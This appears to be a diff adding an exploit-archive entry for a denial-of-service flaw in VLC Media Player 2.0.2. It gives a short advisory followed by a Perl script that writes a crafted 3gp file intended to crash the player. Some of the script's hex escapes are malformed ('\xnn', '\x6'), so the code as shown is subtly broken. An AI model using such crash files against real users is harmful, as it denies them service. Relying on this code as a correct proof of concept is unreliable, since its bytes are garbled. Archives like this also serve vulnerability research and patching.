@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/54791/info
+
+VLC Media Player is prone to a denial-of-service vulnerability.
+
+Successful exploits may allow attackers to crash the affected application, denying service to legitimate users.
+
+VLC Media Player 2.0.2 is vulnerable; other versions may also be affected. 
+
+#!/usr/bin/perl
+my $a ="\x4D\x54\x68\x64\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00";
+my $b ="\x00\x00\x00\xnn\x66\x74\x79\x70\x33\x67\x70";
+my $c ="\x62\x6\x74\x77\x65\x65\x6e\x20\x74\x68\x65\x20\x68\x65\x61\x64\x65\x72\x20\x61\x6e\x64\x20\x74\x68\x65\x20\x66\x6f\x6f\x74\x65\x72\x20\x74\x68\x65\x72\x65\x27\x73\x20\x64\x61\x72\x6b\x2d\x70\x75\x7a\x7a\x6c\x65";
+my $d ="\x33\x67\x70";
+ 
+
+my $file = "darkpuzzle.3gp";
+
+open ($File, ">$file");
+print $File $a,$b,$c,$d;
+close ($File);
